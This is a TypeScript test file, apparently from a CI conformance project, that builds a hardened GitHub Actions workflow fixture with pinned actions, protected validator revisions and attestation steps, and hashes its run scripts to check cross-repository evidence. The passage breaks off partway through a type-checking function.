import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import {
  mkdirSync,
  readFileSync,
  writeFileSync,
} from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { brotliDecompressSync } from 'node:zlib';

import * as ts from 'typescript';
import { describe, expect, test } from 'vitest';

import {
  loadCommittedCaveAssertionEngine,
} from '../scripts/aggregate-client-v1-conformance.mjs';
import * as contract from '../scripts/conformance-contract.mjs';
import {
  verifyGitHubConformanceEvidence,
  verifyProtectedWorkflow,
} from '../scripts/github-conformance-evidence.mjs';
import {
  parseReleaseWorkflowDocument,
} from '../scripts/release-readiness.mjs';
import type {
  CompatibleConformanceWorkflow,
  FrozenConformanceLock,
  ReviewedEvidenceIndex,
} from '../scripts/conformance-contract.mjs';

const workspaceRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const conformanceContractRuntimePath = resolve(
  workspaceRoot,
  'scripts/conformance-contract.mjs',
);
const conformanceContractDeclarationPath = resolve(
  workspaceRoot,
  'scripts/conformance-contract.d.mts',
);
const lockPath = resolve(
  workspaceRoot,
  'conformance/client-v1-cross-repository-lock.json',
);
const registryPath = resolve(
  workspaceRoot,
  'conformance/client-v1-cross-repository-assertions.json',
);
const schemaPath = resolve(
  workspaceRoot,
  'conformance/client-v1-cross-repository-evidence.schema.json',
);
const windowsBootstrapFixturePath = resolve(
  workspaceRoot,
  'tests/fixtures/chat-b406-windows-bootstrap.ps1.br',
);
const PLATFORMS = ['darwin-arm64', 'linux-x64', 'win32-x64'] as const;
const CHECKOUT_ACTION =
  'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1';
const SETUP_NODE_ACTION =
  'actions/setup-node@820762786026740c76f36085b0efc47a31fe5020';
const PNPM_SETUP_ACTION =
  'pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86';
const UPLOAD_ARTIFACT_ACTION =
  'actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a';
const DOWNLOAD_ARTIFACT_ACTION =
  'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c';
const ATTEST_BUILD_PROVENANCE_ACTION =
  'actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8';
const TEST_WINDOWS_SUPERVISOR_ARTIFACT =
  'phase1-process-supervisor-win32-x64';
const TEST_RECORD_PATH =
  '.artifacts/client-v1-conformance-${{ matrix.platform }}.json';
const TEST_ARTIFACT_NAME =
  'client-v1-conformance-${{ matrix.platform }}';
const TEST_VALIDATOR_INPUT = '${' + '{ inputs.validator_revision }}';
const TEST_PROTECTED_VALIDATOR_REVISION =
  '${' + '{ vars.CLIENT_V1_CONFORMANCE_VALIDATOR_REVISION }}';
const TEST_STATIC_ARTIFACTS: CompatibleConformanceWorkflow['artifacts'] = [
  {
    platform: 'darwin-arm64',
    name: 'client-v1-conformance-darwin-arm64',
    recordPath: '.artifacts/client-v1-conformance-darwin-arm64.json',
  },
  {
    platform: 'linux-x64',
    name: 'client-v1-conformance-linux-x64',
    recordPath: '.artifacts/client-v1-conformance-linux-x64.json',
  },
  {
    platform: 'win32-x64',
    name: 'client-v1-conformance-win32-x64',
    recordPath: '.artifacts/client-v1-conformance-win32-x64.json',
  },
];
const TEST_LINUX_SECRET_SERVICE_COMMAND =
  'sudo apt-get install --yes --no-install-recommends dbus-daemon=1.14.10-4ubuntu4.1 gnome-keyring=46.1-2ubuntu0.2 libsecret-tools=0.21.4-1build3';
const TEST_PHASE1_REVISIONS_COMMAND = [
  'node --input-type=module --eval "import { appendFileSync }',
  'from \'node:fs\'; import { readPhase1ConformanceLock }',
  'from \'./scripts/phase1-conformance-lock.mjs\';',
  'const lock = readPhase1ConformanceLock();',
  'for (const repository of [\'sdk\', \'cave\', \'coven\']) {',
  'appendFileSync(process.env.GITHUB_OUTPUT, repository +',
  '\'_repository=\' + lock[repository].repository + \'\\n\');',
  'appendFileSync(process.env.GITHUB_OUTPUT, repository +',
  '\'_revision=\' + lock[repository].revision + \'\\n\'); }',
  'appendFileSync(process.env.GITHUB_OUTPUT, \'evidence_repository=\' +',
  'lock.evidence.repository + \'\\n\');',
  'appendFileSync(process.env.GITHUB_OUTPUT, \'evidence_revision=\' +',
  'lock.evidence.revision + \'\\n\');"',
].join(' ');
const TEST_TOOLCHAIN_COMMAND = [
  'node --input-type=module --eval "import { execFileSync }',
  'from \'node:child_process\'; import { resolveExecutableInvocation }',
  'from \'./scripts/executable-resolution.mjs\';',
  'const run = (command, args) => { const invocation =',
  'resolveExecutableInvocation(command, process.env, process.platform, args);',
  'return execFileSync(invocation.executable, invocation.args,',
  '{ encoding: \'utf8\' }).trim(); };',
  'if (process.version !== \'v24.18.1\'',
  '|| \'pnpm@\' + run(\'pnpm\', [\'--version\']) !== \'pnpm@10.34.0\'',
  '|| !run(\'rustc\', [\'--version\']).startsWith(\'rustc 1.95.0 \'))',
  'throw new Error(\'Frozen toolchain does not match\');"',
].join(' ');
const TEST_UNIX_RUST_INSTALL_COMMAND = [
  'node --input-type=module --eval "import { execFileSync }',
  'from \'node:child_process\'; import { resolveExecutableInvocation }',
  'from \'./scripts/executable-resolution.mjs\';',
  'const command = \'rustup\'; const invocation =',
  'resolveExecutableInvocation(command, process.env, process.platform,',
  '[\'toolchain\', \'install\', \'1.95.0\', \'--profile\', \'minimal\']);',
  'execFileSync(invocation.executable, invocation.args,',
  '{ argv0: command, stdio: \'inherit\' });"',
].join(' ');
const TEST_VALIDATOR_REVISION_COMMAND =
  '[[ "$OPENCOVEN_VALIDATOR_REVISION_INPUT" == "$OPENCOVEN_PROTECTED_VALIDATOR_REVISION" ]]';
// Exact reviewed Windows run bytes, compressed to keep the fixture small.
const TEST_WINDOWS_BOOTSTRAP_COMMAND = brotliDecompressSync(
  readFileSync(windowsBootstrapFixturePath),
).toString('utf8');
if (
  !TEST_WINDOWS_BOOTSTRAP_COMMAND.endsWith('\n')
  || TEST_WINDOWS_BOOTSTRAP_COMMAND.includes('\r')
) {
  throw new Error('Canonical Windows bootstrap fixture is not LF-normalized');
}
const TEST_WINDOWS_CHILD_BOOTSTRAP = requireTestWindowsChildBootstrap(
  TEST_WINDOWS_BOOTSTRAP_COMMAND,
);
const TEST_UNIX_SUPERVISOR_PREPARATION_COMMAND =
  'echo "Frozen harness module graph verified."';
const TEST_UNIX_TOOL_PATH_COMMAND = [
  'node --input-type=module --eval "import { appendFileSync }',
  'from \'node:fs\'; import { resolveUnixToolPath }',
  'from \'./scripts/executable-resolution.mjs\';',
  'const toolPath = resolveUnixToolPath([\'node\', \'corepack\', \'rustup\']);',
  'appendFileSync(process.env.GITHUB_OUTPUT,',
  '\'tool_path=\' + toolPath + \'\\n\');"',
].join(' ');
const TEST_UNIX_PRODUCTION_COMMAND = [
  'set -euo pipefail',
  'mkdir -m 700 .artifacts',
  'if [[ "$(uname -s)" == Darwin ]]; then',
  '  chmod -RN .artifacts',
  'fi',
  'broker_root="/tmp/opencoven-unix-broker"',
  'cleanup_broker_root() {',
  '  rm -f -- "$broker_root/unix-artifact-handoff"',
  '  rmdir "$broker_root" 2>/dev/null || true',
  '}',
  'trap cleanup_broker_root EXIT',
  'sudo --non-interactive scripts/unix-producer-supervisor.sh \\',
  '  --platform "${{ matrix.platform }}" \\',
  '  --source "$GITHUB_WORKSPACE" \\',
  `  --destination "$GITHUB_WORKSPACE/${TEST_RECORD_PATH}" \\`,
  '  --temp-root "$broker_root" \\',
  '  --handoff-helper "/tmp/opencoven-unix-broker/unix-artifact-handoff" \\',
  '  --command scripts/unix-producer-command.sh \\',
  '  --tool-path "${{ steps[\'unix-tool-path\'].outputs.tool_path }}" \\',
  '  --validator-revision "$OPENCOVEN_VALIDATOR_REVISION"',
  '',
].join('\n');
const TEST_CANONICAL_VALIDATION_COMMAND = [
  'node --input-type=module --eval "import { lstatSync, readFileSync }',
  'from \'node:fs\'; const sort = (value) => Array.isArray(value)',
  '? value.map(sort) : value !== null && typeof value === \'object\'',
  '? Object.fromEntries(Object.keys(value).sort().map((key) =>',
  '[key, sort(value[key])])) : value; const path = process.argv[1];',
  'const stats = lstatSync(path); const text = readFileSync(path, \'utf8\');',
  'const value = JSON.parse(text); if (!stats.isFile()',
  '|| stats.isSymbolicLink() || stats.size < 1 || stats.size > 1048576',
  '|| value === null || Array.isArray(value) || value.schemaVersion !== 2',
  '|| value.platform !== process.argv[2]',
  '|| JSON.stringify(sort(value), null, 2) + \'\\n\' !== text)',
  'throw new Error(\'Platform record is not canonical\');"',
  `"${TEST_RECORD_PATH}" "\${{ matrix.platform }}"`,
].join(' ');

function yamlSingleQuoted(value: string): string {
  return `'${value.replaceAll("'", "''")}'`;
}

function yamlLiteralRun(value: string): string {
  const body = value.endsWith('\n') ? value.slice(0, -1) : value;
  return [
    '        run: |',
    ...body.split('\n').map((line) => `          ${line}`),
  ].join('\n');
}

function extractTestWindowsChildBootstrap(source: string): string | null {
  const lines = source.split('\n');
  const start = lines.indexOf("  $childBootstrap = @'");
  const end = lines.findIndex(
    (line, index) => index > start && line === "'@",
  );
  if (start < 0 || end < 0) {
    return null;
  }
  return lines.slice(start + 1, end).join('\n');
}

function requireTestWindowsChildBootstrap(source: string): string {
  const childBootstrap = extractTestWindowsChildBootstrap(source);
  if (childBootstrap === null) {
    throw new Error('Canonical Windows child bootstrap fixture is missing');
  }
  return childBootstrap;
}

function replaceWorkflowRun(
  workflow: string,
  before: string,
  after: string,
): string {
  const renderedBefore = yamlLiteralRun(before);
  if (!workflow.includes(renderedBefore)) {
    throw new Error('Test workflow does not contain the expected run script');
  }
  return workflow.replace(renderedBefore, () => yamlLiteralRun(after));
}

function mutateWindowsChildBootstrap(
  mutate: (source: string) => string,
): string {
  const mutatedChild = mutate(TEST_WINDOWS_CHILD_BOOTSTRAP);
  if (mutatedChild === TEST_WINDOWS_CHILD_BOOTSTRAP) {
    throw new Error('Windows child bootstrap mutation did not change the source');
  }
  const mutatedBootstrap = TEST_WINDOWS_BOOTSTRAP_COMMAND.replace(
    TEST_WINDOWS_CHILD_BOOTSTRAP,
    () => mutatedChild,
  );
  return replaceWorkflowRun(
    TEST_PRODUCER_WORKFLOW_TEXT,
    TEST_WINDOWS_BOOTSTRAP_COMMAND,
    mutatedBootstrap,
  );
}

function producerArtifactSteps(): string[] {
  return [
    `      - uses: ${UPLOAD_ARTIFACT_ACTION}`,
    '        with:',
    `          name: ${TEST_ARTIFACT_NAME}`,
    `          path: ${TEST_RECORD_PATH}`,
    '          if-no-files-found: error',
    '          retention-days: 30',
    '          overwrite: false',
    '          include-hidden-files: true',
  ];
}

function protectedProducerSteps(): string[] {
  return [
    '      - name: Require protected validator revision',
    "        if: matrix.platform != 'win32-x64'",
    '        shell: bash',
    '        env:',
    `          OPENCOVEN_VALIDATOR_REVISION_INPUT: ${TEST_VALIDATOR_INPUT}`,
    `          OPENCOVEN_PROTECTED_VALIDATOR_REVISION: ${TEST_PROTECTED_VALIDATOR_REVISION}`,
    `        run: ${yamlSingleQuoted(TEST_VALIDATOR_REVISION_COMMAND)}`,
    `      - uses: ${CHECKOUT_ACTION}`,
    "        if: matrix.platform != 'win32-x64'",
    '        with:',
    '          fetch-depth: 0',
    '          persist-credentials: false',
    '          ref: ${{ github.sha }}',
    `      - uses: ${SETUP_NODE_ACTION}`,
    "        if: matrix.platform != 'win32-x64'",
    '        with:',
    '          node-version: 24.18.1',
    '      - id: phase1-revisions',
    '        name: Read Phase 1 reviewed revisions',
    "        if: matrix.platform != 'win32-x64'",
    `        run: ${yamlSingleQuoted(TEST_PHASE1_REVISIONS_COMMAND)}`,
    `      - uses: ${CHECKOUT_ACTION}`,
    "        if: matrix.platform != 'win32-x64'",
    '        with:',
    "          repository: ${{ steps['phase1-revisions'].outputs.sdk_repository }}",
    "          ref: ${{ steps['phase1-revisions'].outputs.sdk_revision }}",
    '          path: .phase1-counterparts/sdk',
    '          persist-credentials: false',
    `      - uses: ${CHECKOUT_ACTION}`,
    "        if: matrix.platform != 'win32-x64'",
    '        with:',
    "          repository: ${{ steps['phase1-revisions'].outputs.evidence_repository }}",
    "          ref: ${{ steps['phase1-revisions'].outputs.evidence_revision }}",
    '          path: .phase1-counterparts/sdk-evidence',
    '          persist-credentials: false',
    `      - uses: ${CHECKOUT_ACTION}`,
    "        if: matrix.platform != 'win32-x64'",
    '        with:',
    '          repository: OpenCoven/sdk',
    `          ref: ${TEST_VALIDATOR_INPUT}`,
    '          path: .phase1-counterparts/sdk-validator',
    '          persist-credentials: false',
    `      - uses: ${CHECKOUT_ACTION}`,
    "        if: matrix.platform != 'win32-x64'",
    '        with:',
    "          repository: ${{ steps['phase1-revisions'].outputs.cave_repository }}",
    "          ref: ${{ steps['phase1-revisions'].outputs.cave_revision }}",
    '          path: .phase1-counterparts/coven-cave',
    '          persist-credentials: false',
    `      - uses: ${CHECKOUT_ACTION}`,
    "        if: matrix.platform != 'win32-x64'",
    '        with:',
    "          repository: ${{ steps['phase1-revisions'].outputs.coven_repository }}",
    "          ref: ${{ steps['phase1-revisions'].outputs.coven_revision }}",
    '          path: .phase1-counterparts/coven',
    '          persist-credentials: false',
    `      - uses: ${PNPM_SETUP_ACTION}`,
    "        if: matrix.platform != 'win32-x64'",
    '        with:',
    '          version: 10.34.0',
    '      - name: Install frozen Linux Secret Service',
    "        if: matrix.platform != 'win32-x64' && matrix.platform == 'linux-x64'",
    '        shell: bash',
    `        run: ${yamlSingleQuoted(TEST_LINUX_SECRET_SERVICE_COMMAND)}`,
    '      - name: Install frozen Unix Rust',
    "        if: matrix.platform != 'win32-x64'",
    `        run: ${yamlSingleQuoted(TEST_UNIX_RUST_INSTALL_COMMAND)}`,
    '      - name: Require frozen toolchain',
    "        if: matrix.platform != 'win32-x64'",
    `        run: ${yamlSingleQuoted(TEST_TOOLCHAIN_COMMAND)}`,
    '      - name: Prepare trusted Unix supervisor',
    "        if: matrix.platform != 'win32-x64'",
    '        shell: bash',
    `        run: ${yamlSingleQuoted(TEST_UNIX_SUPERVISOR_PREPARATION_COMMAND)}`,
    '      - name: Compute reviewed Unix tool path',
    '        id: unix-tool-path',
    "        if: matrix.platform != 'win32-x64'",
    `        run: ${yamlSingleQuoted(TEST_UNIX_TOOL_PATH_COMMAND)}`,
    '      - name: Run supervised Unix production and handoff',
    "        if: matrix.platform != 'win32-x64'",
    '        shell: bash',
    '        env:',
    `          OPENCOVEN_VALIDATOR_REVISION: ${TEST_PROTECTED_VALIDATOR_REVISION}`,
    yamlLiteralRun(TEST_UNIX_PRODUCTION_COMMAND),
    '      - name: Validate broker-owned Unix platform record',
    "        if: matrix.platform != 'win32-x64'",
    '        shell: bash',
    `        run: ${yamlSingleQuoted(TEST_CANONICAL_VALIDATION_COMMAND)}`,
    ...producerArtifactSteps(),
  ];
}

function staticDownloadSteps(): string[] {
  return TEST_STATIC_ARTIFACTS.flatMap(({ name }) => [
    `      - uses: ${DOWNLOAD_ARTIFACT_ACTION}`,
    '        with:',
    `          name: ${name}`,
    '          path: .artifacts',
  ]);
}

function staticAttestationSteps(): string[] {
  return TEST_STATIC_ARTIFACTS.flatMap(({ recordPath }) => [
    `      - uses: ${ATTEST_BUILD_PROVENANCE_ACTION}`,
    '        with:',
    `          subject-path: ${recordPath}`,
  ]);
}

function createProducerWorkflow({
  siblingSubstitute = false,
}: {
  siblingSubstitute?: boolean;
} = {}): string {
  return [
    'name: client-v1 conformance',
    'on:',
    '  workflow_dispatch:',
    '    inputs:',
    '      validator_revision:',
    '        required: true',
    '        type: string',
    'permissions:',
    '  contents: read',
    'jobs:',
    '  windows-supervisor:',
    '    name: build-windows-supervisor',
    "    if: github.ref == 'refs/heads/main'",
    '    runs-on: macos-latest',
    '    timeout-minutes: 30',
    '    permissions:',
    '      contents: read',
    '    outputs:',
    "      artifact_id: ${{ steps['upload-supervisor'].outputs['artifact-id'] }}",
    '    steps:',
    `      - uses: ${CHECKOUT_ACTION}`,
    '        with:',
    '          fetch-depth: 0',
    '          persist-credentials: false',
    '          ref: ${{ github.sha }}',
    `      - uses: ${SETUP_NODE_ACTION}`,
    '        with:',
    '          node-version: 24.18.1',
    '      - name: Set up frozen Rust',
    '        run: rustup toolchain install 1.95.0 --profile minimal && rustup default 1.95.0',
    '      - name: Build frozen Windows supervisor',
    '        run: bash scripts/phase1-windows-supervisor-build.sh',
    '      - id: upload-supervisor',
    `        uses: ${UPLOAD_ARTIFACT_ACTION}`,
    '        with:',
    `          name: ${TEST_WINDOWS_SUPERVISOR_ARTIFACT}`,
    '          path: tools/phase1-process-supervisor/target/x86_64-pc-windows-gnu/release/phase1-process-supervisor.exe',
    '          if-no-files-found: error',
    '          retention-days: 30',
    '          overwrite: false',
    '          include-hidden-files: false',
    '  platform-conformance:',
    '    name: platform-conformance (${{ matrix.platform }})',
    "    if: github.ref == 'refs/heads/main'",
    '    needs: windows-supervisor',
    '    timeout-minutes: 60',
    '    strategy:',
    '      fail-fast: false',
    '      matrix:',
    '        include:',
    '          - platform: darwin-arm64',
    '            runner: macos-14',
    '          - platform: linux-x64',
    '            runner: ubuntu-24.04',
    '          - platform: win32-x64',
    '            runner: windows-2025',
    '    runs-on: ${{ matrix.runner }}',
    '    environment: client-v1-conformance',
    '    permissions:',
    '      actions: read',
    '      contents: read',
    '    env:',
    "      GIT_CONFIG_COUNT: '1'",
    '      GIT_CONFIG_KEY_0: core.autocrlf',
    "      GIT_CONFIG_VALUE_0: 'false'",
    '    steps:',
    '      - name: Bootstrap supervised Windows conformance',
    "        if: matrix.platform == 'win32-x64'",
    '        shell: pwsh',
    '        env:',
    `          OPENCOVEN_VALIDATOR_REVISION_INPUT: ${TEST_VALIDATOR_INPUT}`,
    `          OPENCOVEN_PROTECTED_VALIDATOR_REVISION: ${TEST_PROTECTED_VALIDATOR_REVISION}`,
    '          OPENCOVEN_CHAT_REPOSITORY: ${{ github.repository }}',
    '          OPENCOVEN_CHAT_SHA: ${{ github.sha }}',
    "          OPENCOVEN_WINDOWS_IMAGE_OS: 'win25-vs2026'",
    "          OPENCOVEN_WINDOWS_IMAGE_VERSION: '20260824.214.3'",
    "          OPENCOVEN_WINDOWS_BUILD: '26100.33296'",
    "          OPENCOVEN_WINDOWS_KERNEL32_VERSION: '10.0.26100.33296'",
    "          OPENCOVEN_WINDOWS_POWERSHELL_VERSION: '7.6.5'",
    "          OPENCOVEN_WINDOWS_POWERSHELL_PATH: 'C:\\Program Files\\PowerShell\\7\\pwsh.exe'",
    "          OPENCOVEN_WINDOWS_DOTNET_VERSION: '10.0.11'",
    "          OPENCOVEN_WINDOWS_VS_VERSION: '18.9.12112.369'",
    "          OPENCOVEN_WINDOWS_VS_PATH: 'C:\\Program Files\\Microsoft Visual Studio\\18\\Enterprise'",
    "          OPENCOVEN_WINDOWS_MSVC_VERSION: '14.44.35207'",
    "          OPENCOVEN_WINDOWS_MSVC_PATH: 'C:\\Program Files\\Microsoft Visual Studio\\18\\Enterprise\\VC\\Tools\\MSVC\\14.44.35207'",
    "          OPENCOVEN_WINDOWS_CL_PATH: 'C:\\Program Files\\Microsoft Visual Studio\\18\\Enterprise\\VC\\Tools\\MSVC\\14.44.35207\\bin\\Hostx64\\x64\\cl.exe'",
    "          OPENCOVEN_WINDOWS_LINK_PATH: 'C:\\Program Files\\Microsoft Visual Studio\\18\\Enterprise\\VC\\Tools\\MSVC\\14.44.35207\\bin\\Hostx64\\x64\\link.exe'",
    "          OPENCOVEN_WINDOWS_SDK_VERSION: '10.0.26100.0'",
    "          OPENCOVEN_WINDOWS_RC_PATH: 'C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.26100.0\\x64\\rc.exe'",
    "          OPENCOVEN_WINDOWS_SUPERVISOR_ARTIFACT_ID: ${{ needs['windows-supervisor'].outputs.artifact_id }}",
    '          OPENCOVEN_WINDOWS_GITHUB_API_URL: ${{ github.api_url }}',
    '          OPENCOVEN_WINDOWS_GITHUB_REPOSITORY: ${{ github.repository }}',
    '          OPENCOVEN_WINDOWS_GITHUB_TOKEN: ${{ github.token }}',
    yamlLiteralRun(TEST_WINDOWS_BOOTSTRAP_COMMAND),
    ...(siblingSubstitute
      ? protectedProducerSteps().slice(0, -producerArtifactSteps().length)
      : protectedProducerSteps()),
    ...(siblingSubstitute
      ? [
          '  sibling-substitute:',
          '    name: sibling-substitute',
          '    runs-on: ubuntu-24.04',
          '    steps:',
          ...producerArtifactSteps(),
        ]
      : []),
    '  validate-conformance-artifacts:',
    '    name: validate-conformance-artifacts',
    "    if: github.ref == 'refs/heads/main'",
    '    needs: platform-conformance',
    '    runs-on: ubuntu-24.04',
    '    environment: client-v1-conformance',
    '    permissions:',
    '      contents: read',
    '    outputs:',
    '      darwin_arm64_sha256: ${{ steps.validate.outputs.darwin_arm64_sha256 }}',
    '      linux_x64_sha256: ${{ steps.validate.outputs.linux_x64_sha256 }}',
    '      win32_x64_sha256: ${{ steps.validate.outputs.win32_x64_sha256 }}',
    '    steps:',
    '      - name: Require protected validator revision',
    '        shell: bash',
    '        env:',
    `          OPENCOVEN_VALIDATOR_REVISION_INPUT: ${TEST_VALIDATOR_INPUT}`,
    `          OPENCOVEN_PROTECTED_VALIDATOR_REVISION: ${TEST_PROTECTED_VALIDATOR_REVISION}`,
    '        run: |',
    '          if [[ "$OPENCOVEN_VALIDATOR_REVISION_INPUT" != "$OPENCOVEN_PROTECTED_VALIDATOR_REVISION" ]]; then',
    '            exit 1',
    '          fi',
    ...staticDownloadSteps(),
    `      - uses: ${CHECKOUT_ACTION}`,
    '        with:',
    '          repository: OpenCoven/sdk',
    `          ref: ${TEST_PROTECTED_VALIDATOR_REVISION}`,
    '          path: validator',
    '          persist-credentials: false',
    `      - uses: ${SETUP_NODE_ACTION}`,
    '        with:',
    '          node-version: 24.18.1',
    '      - name: Validate exact SDK schema, parser, and scanner',
    '        id: validate',
    '        shell: bash',
    `        run: 'parsePlatformEvidence(text, \`\${platform} uploaded artifact\`, schema); scanConformanceEvidence(record); createHash(''sha256'').update(bytes).digest(''hex''); serializeCanonicalJson(record) !== text'`,
    '  attest-conformance-artifacts:',
    '    name: attest-conformance-artifacts',
    "    if: github.ref == 'refs/heads/main'",
    '    needs: validate-conformance-artifacts',
    '    runs-on: ubuntu-24.04',
    '    environment: client-v1-conformance',
    '    permissions:',
    '      attestations: write',
    '      contents: read',
    '      id-token: write',
    '    steps:',
    ...staticDownloadSteps(),
    '      - name: Compare freshly downloaded artifact digests',
    '        shell: bash',
    '        env:',
    `          OPENCOVEN_VALIDATOR_REVISION_INPUT: ${TEST_VALIDATOR_INPUT}`,
    `          OPENCOVEN_PROTECTED_VALIDATOR_REVISION: ${TEST_PROTECTED_VALIDATOR_REVISION}`,
    '          OPENCOVEN_DARWIN_ARM64_SHA256: ${{ needs[\'validate-conformance-artifacts\'].outputs.darwin_arm64_sha256 }}',
    '          OPENCOVEN_LINUX_X64_SHA256: ${{ needs[\'validate-conformance-artifacts\'].outputs.linux_x64_sha256 }}',
    '          OPENCOVEN_WIN32_X64_SHA256: ${{ needs[\'validate-conformance-artifacts\'].outputs.win32_x64_sha256 }}',
    "        run: '[[ \"$OPENCOVEN_VALIDATOR_REVISION_INPUT\" != \"$OPENCOVEN_PROTECTED_VALIDATOR_REVISION\" ]] && exit 1; sha256sum .artifacts/client-v1-conformance-darwin-arm64.json; sha256sum .artifacts/client-v1-conformance-linux-x64.json; sha256sum .artifacts/client-v1-conformance-win32-x64.json'",
    ...staticAttestationSteps(),
    '  aggregate-conformance:',
    '    name: aggregate-conformance',
    "    if: github.ref == 'refs/heads/main'",
    '    needs: attest-conformance-artifacts',
    '    runs-on: ubuntu-24.04',
    '    permissions: {}',
    '    steps:',
    '      - name: Confirm protected evidence matrix',
    '        run: echo "protected evidence matrix completed"',
    '',
  ].join('\n');
}

const TEST_PRODUCER_WORKFLOW_TEXT = createProducerWorkflow();
const workflowScriptSha256 = (
  workflowText: string,
  job: string,
  name: string,
) => {
  const workflow = parseReleaseWorkflowDocument(workflowText) as {
    jobs: Record<string, { steps: Array<Record<string, unknown>> }>;
  };
  const step = workflow.jobs[job]?.steps.find(
    (candidate) => candidate.name === name,
  );
  if (typeof step?.run !== 'string') {
    throw new Error(`Missing ${job} test workflow script`);
  }
  return sha256(step.run);
};
const testWorkflowScriptSha256 = (job: string, name: string) =>
  workflowScriptSha256(TEST_PRODUCER_WORKFLOW_TEXT, job, name);
const TEST_COMPATIBLE_PRODUCER = {
  status: 'compatible',
  repository: 'OpenCoven/chat',
  commit: 'f'.repeat(40),
  tree: 'c'.repeat(40),
  packageManifest: {
    path: 'package.json',
    size: 3_500,
    sha256: '1'.repeat(64),
  },
  harness: {
    path: 'scripts/phase1-conformance.mjs',
    version: '0.1.0',
    size: 120_000,
    sha256: '2'.repeat(64),
  },
  command: 'test:phase1-conformance',
  recordSchemaVersion: 2,
  workflow: {
    name: 'client-v1 conformance',
    path: '.github/workflows/client-v1-conformance.yml',
    size: Buffer.byteLength(TEST_PRODUCER_WORKFLOW_TEXT, 'utf8'),
    sha256: sha256(TEST_PRODUCER_WORKFLOW_TEXT),
    job: 'platform-conformance',
    jobNameTemplate: 'platform-conformance ({platform})',
    aggregationJob: 'aggregate-conformance',
    aggregationJobName: 'aggregate-conformance',
    aggregationRunnerLabels: ['ubuntu-24.04'],
    validationJob: 'validate-conformance-artifacts',
    validationJobName: 'validate-conformance-artifacts',
    attestationJob: 'attest-conformance-artifacts',
    attestationJobName: 'attest-conformance-artifacts',
    environment: 'client-v1-conformance',
    environmentId: '20863036831',
    artifactNameTemplate: 'client-v1-conformance-{platform}',
    recordPathTemplate:
      '.artifacts/client-v1-conformance-{platform}.json',
    artifacts: TEST_STATIC_ARTIFACTS,
    downloadArtifactAction: DOWNLOAD_ARTIFACT_ACTION,
    attestationAction: ATTEST_BUILD_PROVENANCE_ACTION,
    windowsBootstrapScriptSha256: testWorkflowScriptSha256(
      'platform-conformance',
      'Bootstrap supervised Windows conformance',
    ),
    validatorRevisionScriptSha256: testWorkflowScriptSha256(
      'platform-conformance',
      'Require protected validator revision',
    ),
    phase1RevisionsScriptSha256: testWorkflowScriptSha256(
      'platform-conformance',
      'Read Phase 1 reviewed revisions',
    ),
    linuxKeyringSetupScriptSha256: testWorkflowScriptSha256(
      'platform-conformance',
      'Install frozen Linux Secret Service',
    ),
    unixSupervisorPreparationScriptSha256: testWorkflowScriptSha256(
      'platform-conformance',
      'Prepare trusted Unix supervisor',
    ),
    unixToolPathSource: {
      path: 'scripts/executable-resolution.mjs',
      size: 9_154,
      sha256: '4'.repeat(64),
    },
    unixToolPathScriptSha256: testWorkflowScriptSha256(
      'platform-conformance',
      'Compute reviewed Unix tool path',
    ),
    unixProductionScriptSha256: testWorkflowScriptSha256(
      'platform-conformance',
      'Run supervised Unix production and handoff',
    ),
    unixValidationScriptSha256: testWorkflowScriptSha256(
      'platform-conformance',
      'Validate broker-owned Unix platform record',
    ),
    validationGuardScriptSha256: testWorkflowScriptSha256(
      'validate-conformance-artifacts',
      'Require protected validator revision',
    ),
    validationScriptSha256: testWorkflowScriptSha256(
      'validate-conformance-artifacts',
      'Validate exact SDK schema, parser, and scanner',
    ),
    attestationScriptSha256: testWorkflowScriptSha256(
      'attest-conformance-artifacts',
      'Compare freshly downloaded artifact digests',
    ),
    validatorRevisionEnvironment:
      'CLIENT_V1_CONFORMANCE_VALIDATOR_REVISION',
    sourceRef: 'refs/heads/main',
    runnerLabels: {
      'darwin-arm64': ['macos-14'],
      'linux-x64': ['ubuntu-24.04'],
      'win32-x64': ['windows-2025'],
    },
    signerWorkflow:
      'OpenCoven/chat/.github/workflows/client-v1-conformance.yml',
    signerDigest: 'f'.repeat(40),
    sourceDigest: 'f'.repeat(40),
    predicateType: 'https://slsa.dev/provenance/v1',
    denySelfHostedRunners: true,
  },
} as const;

function sha256(bytes: string | Buffer): string {
  return createHash('sha256').update(bytes).digest('hex');
}

function requiredFunction(name: string): (...args: never[]) => unknown {
  const value = (contract as unknown as Record<string, unknown>)[name];
  expect(value, `${name} must be exported`).toBeTypeOf('function');
  return value as (...args: never[]) => unknown;
}

type CompatibleEvidenceProducer = Extract<
  FrozenConformanceLock['evidenceProducer'],
  { status: 'compatible' }
>;
type EqualTypes<Left, Right> =
  (<Value>() => Value extends Left ? 1 : 2) extends
  (<Value>() => Value extends Right ? 1 : 2)
    ? true
    : false;

const COMPATIBLE_WORKFLOW_DECLARATIONS_MATCH: EqualTypes<
  CompatibleEvidenceProducer['workflow'],
  ReviewedEvidenceIndex['producer']['workflow']
> = true;

function compileCompatibleWorkflowDeclaration(
  workflow: CompatibleConformanceWorkflow,
): void {
  const name: 'client-v1 conformance' = workflow.name;
  const path: '.github/workflows/client-v1-conformance.yml' = workflow.path;
  const job: 'platform-conformance' = workflow.job;
  const jobNameTemplate: 'platform-conformance ({platform})' =
    workflow.jobNameTemplate;
  const aggregationJob: 'aggregate-conformance' = workflow.aggregationJob;
  const aggregationJobName: 'aggregate-conformance' =
    workflow.aggregationJobName;
  const aggregationRunner: 'ubuntu-24.04' =
    workflow.aggregationRunnerLabels[0];
  const validationJob: 'validate-conformance-artifacts' =
    workflow.validationJob;
  const validationJobName: 'validate-conformance-artifacts' =
    workflow.validationJobName;
  const attestationJob: 'attest-conformance-artifacts' =
    workflow.attestationJob;
  const attestationJobName: 'attest-conformance-artifacts' =
    workflow.attestationJobName;
  const downloadArtifactAction:
    'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c' =
      workflow.downloadArtifactAction;
  const attestationAction:
    'actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8' =
      workflow.attestationAction;
